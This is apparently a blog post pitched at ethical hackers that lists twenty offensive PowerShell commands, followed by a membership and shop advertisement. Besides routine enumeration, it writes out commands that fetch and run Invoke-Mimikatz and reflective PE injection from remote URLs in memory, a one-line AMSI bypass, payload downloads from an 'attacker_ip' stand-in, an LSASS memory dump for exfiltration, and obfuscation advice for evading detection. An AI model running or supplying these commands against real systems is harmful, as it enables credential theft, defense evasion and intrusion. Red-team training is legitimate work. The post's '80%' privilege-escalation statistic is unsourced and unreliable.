# Offensive PowerShell 2025: 20 Commands That Still Work for Ethical Hackers and Red Teamers

**Published:** 2026-02-11


Ever wonder why some PowerShell commands just don’t die — no matter how many times Microsoft “locks things down”? Here’s a wild stat: over 80% of successful Windows privilege escalations in 2024 still used classic PowerShell tricks that date back years. You’d think defenders would catch up. But in practice, attack surfaces move slower than you might hope.

If you’re a pentester, bug bounty hunter, or blue teamer wanting to think like an attacker, mastering the real-world PowerShell commands that **still** work in 2025 is a superpower. This is your guide — straight to the point, hands-on, and packed with code you’ll want to save.

![Image](https://miro.medium.com/v2/resize:fit:700/0*j-itncZgbONnVM3D)

*Photo by Markus Spiske on Unsplash*

### Why Offensive PowerShell Still Matters in 2025

Let’s get something straight: PowerShell isn’t dead for hackers. Even with AMSI, Defender, and EDRs everywhere, attackers keep finding ways around. Why? Because most environments still depend on PowerShell for legitimate admin tasks. So, its attack surface is massive — and your best bet to break in, pivot, or escalate if you’re doing red teaming or pentesting.

### PowerShell in Modern Pentesting: Still King?

*   **Post-exploitation:** Once you’re in, PowerShell’s built-in nature means you avoid dropping suspicious binaries.
*   **Living off the land:** PowerShell is **everywhere** on Windows. That “LOLBAS” game? PowerShell is the first card hackers play.
*   **Bypassing defenses:** With obfuscation, in-memory execution, and clever trickery, old commands still pop shells.

Here’s what you need: a no-nonsense list of the PowerShell commands that **still** work. Real stuff. Not theoretical. Let’s roll.

### Basic Reconnaissance: Who Am I, Where Am I?

Knowing your footing is the first step. Never skip these.

### Get Current User Context

whoami

Or, the PowerShell-native way:

\[System.Security.Principal.WindowsIdentity\]::GetCurrent().Name

**When would you use this?**

Right after gaining a foothold on a box. You want to know what you’re running as — are you SYSTEM, LocalAdmin, or just a regular Joe?

### Quick Host and Domain Info

hostname

(Get-WmiObject Win32\_ComputerSystem).Domain

Combined, these give you the host and its place in AD — critical for lateral movement or privilege escalation.

### 2\. List Local and Domain Users

Still classic, still gold.

### Enumerate Local Users

Get\-LocalUser

If you’re on older boxes, swap with:

net user

### Discover Domain Users

Get\-ADUser \-Filter \* | Select\-Object Name,SamAccountName

**Pro tip:** If you don’t have RSAT or AD modules loaded, use:

net user /domain

### 3\. Dump Active Sessions and Logged-In Users

User enumeration is still a goldmine for attacks like credential theft and lateral moves.

qwinsta

query user

Or via PowerShell:

Get\-WmiObject -Class Win32\_LoggedOnUser

You might think defenders would detect this, but in most environments? These queries still slip by.

### 4\. List Running Processes (Find AV, EDR, Passwords)

You want to know what’s watching you — and what you can hijack.

Get\-Process

To filter for known AV/EDR processes:

Get-Process | Where-Object {$\_.ProcessName -match 'defender|carbonblack|crowdstrike|sentinel'}

Or, just:

tasklist

Look for “powershell.exe” or “cmd.exe” with suspicious parents. That’s often a sign of another attacker, too.

### 5\. Network Recon: Interfaces, Connections, Routing

You can’t pivot without knowing the network.

### List All Interfaces

Get\-NetIPAddress

### Connections and Open Ports

Get\-NetTCPConnection

Or the old dance:

netstat -ano

Which is faster, honestly, for a quick glance. See a weird listening port? Now you’ve got a clue for lateral movement or data exfil.

### 6\. Dump Credentials with Mimikatz (Invoke-Mimikatz)

Okay, you **knew** this had to be here.

Even now, running Mimikatz in-memory via PowerShell works in more environments than defenders care to admit. The “Invoke-Mimikatz” script is the classic.

IEX (New\-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')  
Invoke-Mimikatz

**Don**’t want to touch disk?

That `IEX` trick loads the script directly into memory. Defender will sometimes flag, but if AMSI is patched or old, you’re golden.

### 7\. AMSI Bypass (Anti-Malware Scan Interface)

This one’s a cat-and-mouse game. But you’d be shocked how often this still works in 2025 — especially on unpatched or badly managed machines.

### One-Liner AMSI Bypass

\[Ref\].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

You might see new Defender signatures, but this technique — or slight tweaks — often sneak past.

### 8\. Downloading Files: Living Off the Land

Need to drop a tool? PowerShell’s web capabilities are your friend.

### Download via Invoke-WebRequest

Invoke-WebRequest -Uri "http://attacker\_ip/payload.exe" -OutFile "C:\\Windows\\Temp\\payload.exe"

Or the old-school way:

(New\-Object System.Net.WebClient).DownloadFile('http://attacker\_ip/payload.exe','C:\\Windows\\Temp\\payload.exe')

This command is a favorite for dropping ransomware, C2 implants, or just your next stage script.

### 9\. Execute Code in Memory: Reflective PE Injection

Dropping files to disk? Too noisy. The cool part? PowerShell can still load and run binaries straight into memory.

### Invoke-ReflectivePEInjection (From PowerSploit)

IEX (New\-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-ReflectivePEInjection.ps1')  
Invoke\-ReflectivePEInjection -PEBytes (\[IO.File\]::ReadAllBytes('C:\\Path\\to\\payload.dll')) -FunctionName "DllMain"

**Why bother?**

EDR hates files on disk. In-memory drops are way stealthier.

### 10\. Dump LSASS for Passwords (Handle-Based)

Credential theft is still the #1 post-exploitation move. If Mimikatz gets flagged, try this sneaky PowerShell way.

### Dump LSASS with comsvcs.dll

rundll32.exe comsvcs.dll, MiniDump (Get\-Process lsass).Id C:\\Windows\\Temp\\lsass.dmp full

You can trigger this from PowerShell, then exfiltrate the dump. Crack offline with Mimikatz or pypykatz.

### 11\. Lateral Movement via PsExec (PowerShell Alternative)

PsExec gets flagged everywhere — but you can still “roll your own” with PowerShell remoting.

### Instant PowerShell Remoting

Enter-PSSession -ComputerName target01 -Credential (Get-Credential)

Or, for mass commands:

Invoke-Command -ComputerName target01,target02 -ScriptBlock { whoami }

Provided WinRM is enabled (which it is, in way more organizations than people admit), this just works.

### 12\. Enumerate Scheduled Tasks (Persistence Discovery)

Persistence is the name of the game.

### List All Scheduled Tasks

Get\-ScheduledTask

Or the old-school way:

schtasks /query /fo LIST /v

Review output for weird “cmd.exe” or “powershell.exe” triggers. I’ve caught hidden backdoors with this more times than I’d like to admit.

### 13\. Abusing Unquoted Service Paths (Privilege Escalation)

Unquoted service paths are the classic escalation bug. Still everywhere.

### List All Service Paths

Get-WmiObject win32\_service | Where-Object { $\_.PathName -notlike '"\*"' -and $\_.StartMode -eq 'Auto' } | Select-Object Name,PathName

See a path like `C:\Program Files\Vulnerable App\Service.exe`? Drop your own executable in `C:\Program Files\Vulnerable.exe` and restart the service. Boom — escalated.

### 14\. Find Interesting Files (Passwords, Keys, Configs)

Still the bread and butter of bug bounty and internal pentesting.

### Search for Passwords in Files

Get\-ChildItem \-Path C:\\ \-Include \*.xml,\*.config,\*.ini,\*.txt \-Recurse \-ErrorAction SilentlyContinue | Select\-String \-Pattern "password|pwd|secret"

You’ll be amazed what admins leave behind.

### 15\. Enumerate Installed Software (Find Vulnerable Apps)

Vulnerable software is a gold mine for RCE, DLL hijacking, and privilege escalation.

### List Installed Software

Get\-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\\* | Select\-Object DisplayName,DisplayVersion,Publisher

Or the 64-bit equivalent:

Get\-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\\* | Select\-Object DisplayName,DisplayVersion,Publisher

Cross-reference versions with public exploits. Old Java, Flash, or forgotten web servers? Jackpot.

### 16\. SMB and File Share Enumeration

Most networks are still SMB spaghetti. Lateral movement heaven.

### List All Shares

net share

Enumerate remote shares:

net view \\\\targethost

Or PowerShell style:

Get\-SmbShare

Find “everyone” or “authenticated users” permissions. These are ripe targets for data exfiltration or planting a backdoor.

### 17\. Abusing PowerShell History (Credential Hunting)

Sysadmins still paste passwords into PowerShell. Don’t act surprised.

### Dump PowerShell History

Get-Content (Get-PSReadlineOption).HistorySavePath

You’ll often see plain-text creds, AWS keys, or juicy commands. All from the past.

### 18\. Local Group Enumeration for Hidden Admins

Attackers and defenders alike need to know who’s a local admin… attackers, so they know whose creds to steal.

### List Local Admins

Get\-LocalGroupMember \-Group "Administrators"

Or fallback (for older systems):

net localgroup administrators

Find domain users in the group? Instant privilege escalation path.

### 19\. Identify UAC Bypass Opportunities

User Account Control is supposed to stop privilege escalation, but loopholes abound.

### Check for UAC Settings

Get\-ItemProperty \-Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' | Select\-Object ConsentPromptBehaviorAdmin

Low values mean UAC can be bypassed with known tricks. Spot a 0 or 1? Someone’s asking for trouble.

### 20\. Dump Event Logs for Blue Team Evasion

Sometimes, you don’t want to cover your tracks — you want to see if blue team is onto you.

### Read Security Log (for Recent Activity)

Get\-EventLog \-LogName Security \-Newest 100

Or for PowerShell logs:

Get\-WinEvent \-LogName "Microsoft-Windows-PowerShell/Operational" \-MaxEvents 100

You’ll spot other attackers or blue teamers poking around. I’ve found defenders running “whoami” in panic after red team alerts.

### What’s Next? Tactics for Staying Ahead

You’ve got the commands. But how do you keep them working, year after year? Here’s what separates script kiddies from skilled operators:

*   **Obfuscate:** Change variables, mix up command order, encode scripts.
*   **Update techniques:** Defenders patch signatures, but not root behaviors. Modify your approach, not just the payload.
*   **Test in labs:** Set up a Windows 11 VM, install Defender, try each command. Some will get flagged, others won’t.
*   **Join the community:** Offensive PowerShell evolves fast. Follow GitHub repos like PowerSploit, Nishang, and trusted Twitter/X hackers.

And honestly, don’t overcomplicate — classic commands keep working because defenders get lazy, configs drift, and “secure by default” is more myth than reality. If you’re hunting bugs, doing red team, or just want to know how attackers think, these twenty PowerShell moves are your toolkit.

The next time someone says, “PowerShell attacks are dead,” just raise an eyebrow. The real world? It’s still wide open.

Happy hacking.

### 🚀 Become a VeryLazyTech Member — Get Instant Access

What you get today:

✅ **70GB Google Drive** packed with cybersecurity content

✅ **3 full courses** to level up fast

👉 **Join the Membership** → [https://shop.verylazytech.com](https://shop.verylazytech.com)

### 📚 Need Specific Resources?

✅ Instantly download the **best hacking guides, OSCP prep kits, cheat sheets, and scripts** used by real security pros.

👉 **Visit the Shop** → [https://shop.verylazytech.com](https://shop.verylazytech.com)

### 💬 Stay in the Loop

Want quick tips, free tools, and sneak peeks?

✖ [https://x.com/verylazytech/](https://x.com/verylazytech/)

| 👾 [https://github.com/verylazytech/](https://github.com/verylazytech/)

| 📺 [https://youtube.com/@verylazytech/](https://youtube.com/@verylazytech/)

| 📩 [https://t.me/+mSGyb008VL40MmVk/](https://t.me/+mSGyb008VL40MmVk/)

| 🕵️‍♂️ [https://www.verylazytech.com/](https://www.verylazytech.com/)